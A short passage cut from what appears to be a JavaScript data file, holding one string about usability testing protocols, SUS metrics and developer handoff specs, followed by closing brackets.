            `Design Principle 3: Usability testing protocols, SUS metrics, and dev handoff specs.`
          ]
        }
      ]
    }))
  }
};
